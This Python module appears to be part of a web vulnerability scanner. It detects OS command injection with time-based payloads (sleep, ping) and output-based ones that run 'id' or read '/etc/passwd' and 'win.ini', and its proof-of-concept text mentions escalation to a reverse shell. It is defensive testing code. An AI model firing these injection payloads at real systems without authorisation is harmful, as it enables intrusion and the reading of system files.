"""OS Command Injection Scanner — detects server-side command execution vulnerabilities."""
from __future__ import annotations
import asyncio
import time
from typing import List
from core.base_scanner import BaseScanner
from core.models import Finding, ScanState
from config.settings import Severity

# Time-based payloads (safest — no side effects)
TIME_PAYLOADS = [
    {"payload": ";sleep 5;", "delay": 5, "os": "linux"},
    {"payload": "|sleep 5|", "delay": 5, "os": "linux"},
    {"payload": "`sleep 5`", "delay": 5, "os": "linux"},
    {"payload": "$(sleep 5)", "delay": 5, "os": "linux"},
    {"payload": "%0asleep 5%0a", "delay": 5, "os": "linux"},
    {"payload": "& ping -n 5 127.0.0.1 &", "delay": 5, "os": "windows"},
    {"payload": "| ping -n 5 127.0.0.1", "delay": 5, "os": "windows"},
    {"payload": "\nping -n 5 127.0.0.1\n", "delay": 5, "os": "windows"},
]

# Output-based payloads (look for known output in response)
OUTPUT_PAYLOADS = [
    # Linux
    {"payload": ";id;", "signatures": ["uid=", "gid="], "os": "linux"},
    {"payload": "|id", "signatures": ["uid=", "gid="], "os": "linux"},
    {"payload": "`id`", "signatures": ["uid=", "gid="], "os": "linux"},
    {"payload": "$(id)", "signatures": ["uid=", "gid="], "os": "linux"},
    {"payload": ";cat /etc/passwd;", "signatures": ["root:x:0"], "os": "linux"},
    {"payload": "$(cat /etc/passwd)", "signatures": ["root:x:0"], "os": "linux"},
    # Windows
    {"payload": "& echo CMDINJTEST1337", "signatures": ["CMDINJTEST1337"], "os": "windows"},
    {"payload": "| type C:\\windows\\win.ini", "signatures": ["[fonts]", "[extensions]"], "os": "windows"},
]

# Parameters likely to be passed to OS commands
CMDINJECTION_PARAMS = [
    "cmd", "exec", "command", "run", "ping", "query", "jump",
    "file", "filename", "path", "dir", "folder", "log",
    "ip", "host", "hostname", "target", "domain", "url",
    "daemon", "upload", "download", "process", "execute",
    "email", "to", "from", "src", "source", "dest",
]


class CommandInjectionScanner(BaseScanner):
    name = "command_injection"
    description = "Detects OS command injection vulnerabilities"
    tags = ["injection", "rce", "owasp-a03"]

    async def run(self, state: ScanState) -> List[Finding]:
        findings = []
        tasks = []

        for url, params in state.target.discovered_params.items():
            for param in params:
                # Prioritize suspicious parameter names
                is_suspicious = param.lower() in CMDINJECTION_PARAMS
                if is_suspicious:
                    # Test all payloads on suspicious params
                    tasks.append(self._test_time_based(url, param))
                    tasks.append(self._test_output_based(url, param))
                else:
                    # Only test time-based on other params (less noise)
                    tasks.append(self._test_time_based(url, param))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, Finding):
                findings.append(r)

        return findings

    async def _test_time_based(self, url: str, param: str) -> Finding | None:
        """Test for blind command injection using time delays."""
        # First, measure baseline response time
        baseline_start = time.monotonic()
        baseline_resp, _ = await self.client.get(url)
        baseline_time = time.monotonic() - baseline_start

        if not baseline_resp:
            return None

        for p in TIME_PAYLOADS:
            start = time.monotonic()
            resp, raw_req = await self.test_payload(
                url, "GET", param, p["payload"], inject_in="query"
            )
            elapsed = time.monotonic() - start

            if not resp:
                continue

            # Check if response was delayed by at least expected delay
            expected_min = baseline_time + p["delay"] - 1
            if elapsed >= expected_min:
                return self.make_finding(
                    title=f"Blind OS Command Injection in '{param}'",
                    vuln_type="command_injection_time",
                    severity=Severity.CRITICAL,
                    url=url, parameter=param, payload=p["payload"],
                    evidence=(
                        f"Time-based detection: baseline={baseline_time:.1f}s, "
                        f"with payload={elapsed:.1f}s (expected delay: {p['delay']}s, OS: {p['os']})"
                    ),
                    request=raw_req,
                    cwe_id="CWE-78",
                    owasp_category="A03:2021 - Injection",
                    description=(
                        f"Parameter '{param}' is passed to an OS command. "
                        f"Injecting a sleep/ping command caused a measurable delay, "
                        f"confirming server-side command execution. This is a critical "
                        f"vulnerability leading to full system compromise."
                    ),
                    poc_steps=[
                        f"1. Send request to {url} with normal parameter value",
                        f"2. Measure response time (baseline: {baseline_time:.1f}s)",
                        f"3. Set {param}={p['payload']}",
                        f"4. Response delayed to {elapsed:.1f}s (confirms execution)",
                        f"5. Escalate with: ;id; or ;cat /etc/passwd; for output",
                    ],
                )
        return None

    async def _test_output_based(self, url: str, param: str) -> Finding | None:
        """Test for command injection by checking for known command output."""
        for p in OUTPUT_PAYLOADS:
            resp, raw_req = await self.test_payload(
                url, "GET", param, p["payload"], inject_in="query"
            )
            if not resp:
                continue

            body = resp.text
            for sig in p["signatures"]:
                if sig in body:
                    return self.make_finding(
                        title=f"OS Command Injection in '{param}'",
                        vuln_type="command_injection_output",
                        severity=Severity.CRITICAL,
                        url=url, parameter=param, payload=p["payload"],
                        evidence=f"Command output detected: '{sig}' in response (OS: {p['os']})",
                        request=raw_req,
                        response=body[:500],
                        cwe_id="CWE-78",
                        owasp_category="A03:2021 - Injection",
                        description=(
                            f"Parameter '{param}' is vulnerable to OS command injection. "
                            f"The injected command's output appeared in the response. "
                            f"This allows full server compromise."
                        ),
                        poc_steps=[
                            f"1. Set {param}={p['payload']}",
                            f"2. Command executes on server ({p['os']})",
                            f"3. Output visible in response: {sig}",
                            "4. Full system access: read files, reverse shell, pivot",
                        ],
                    )
        return None
